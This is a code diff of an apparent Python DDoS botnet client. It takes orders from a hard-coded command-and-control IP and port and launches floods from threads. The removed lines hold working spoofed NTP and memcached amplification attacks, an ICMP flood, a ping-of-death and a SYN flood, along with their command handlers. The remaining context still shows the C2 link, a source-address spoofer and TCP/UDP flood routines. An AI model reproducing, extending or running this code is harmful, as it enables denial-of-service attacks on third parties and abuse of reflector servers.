@@ -8,54 +8,9 @@ import random
 import cloudscraper
 import requests
 import ctypes
-from icmplib import ping as pig
-from scapy.all import IP, UDP, Raw, send
 
 C2_ADDRESS = "147.185.221.24"
 C2_PORT = 21142
-
-ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
-def NTP(target, port, timer):
-    with open("ntpServers.txt", "r") as f:
-        ntp_servers = f.readlines()
-    packets = random.randint(10, 150)
-    server = random.choice(ntp_servers).strip()
-    while time.time() < timer:
-        packet = (
-                IP(dst=server, src=target)
-                / UDP(sport=random.randint(1, 65535), dport=int(port))
-                / Raw(load=ntp_payload)
-        )
-        for _ in range(50000000):
-            send(packet, count=packets, verbose=False)
-
-mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
-def MEM(target, port, timer):
-    packets = random.randint(1024, 60000)
-    with open("memsv.txt", "r") as f:
-        memsv = f.readlines()
-    server = random.choice(memsv).strip()
-    while time.time() < timer:
-        packet = (
-                IP(dst=server, src=target)
-                / UDP(sport=port, dport=11211)
-                / Raw(load=mem_payload)
-        )
-        for _ in range(5000000):
-            send(packet, count=packets, verbose=False)
-
-def icmp(target, timer):
-    while time.time() < timer:
-        for _ in range(5000000):
-            packet = random._urandom(int(random.randint(1024, 60000)))
-            pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
-
-def pod(target, timer):
-    while time.time() < timer:
-        rand_addr = spoofer()
-        ip_hdr = IP(src=rand_addr, dst=target)
-        packet = ip_hdr / ICMP() / ("m" * 60000)
-        send(packet)
 
 def spoofer():
     addr = [192, 168, 0, 1]
@@ -80,16 +35,6 @@ def attack_tcp(ip, port, secs, size=65500):
         s.connect((ip, port))
         while time.time() < secs:
             s.send(random._urandom(size))
-
-def attack_syn(ip, port, secs):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        flags = 0b01000000
-        s.connect((ip, port))
-        pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
-        while time.time() < secs:
-            s.send(pkt)
-        s.close()
 
 def attack_tup(ip, port, secs, size=65500):
     while time.time() < secs:
@@ -183,39 +128,6 @@ def handle_c2_connection(c2):
                     threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-            elif command == '!NTP':
-                ip = args[1]
-                port = int(args[2])
-                timer = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()
-            elif command == '!MEM':
-                ip = args[1]
-                port = int(args[2])
-                timer = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()
-            elif command == '!ICMP':
-                ip = args[1]
-                timer = time.time() + int(args[2])
-                threads = int(args[3])
-                for _ in range(threads):
-                    threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()
-            elif command == '!POD':
-                ip = args[1]
-                timer = time.time() + int(args[2])
-                threads = int(args[3])
-                for _ in range(threads):
-                    threading.Thread(target=pod, args=(ip, timer), daemon=True).start()
-            elif command == '!SYN':
-                ip = args[1]
-                port = int(args[2])
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
             elif command == '!PING':
                 c2.send('PONG'.encode())
         except:
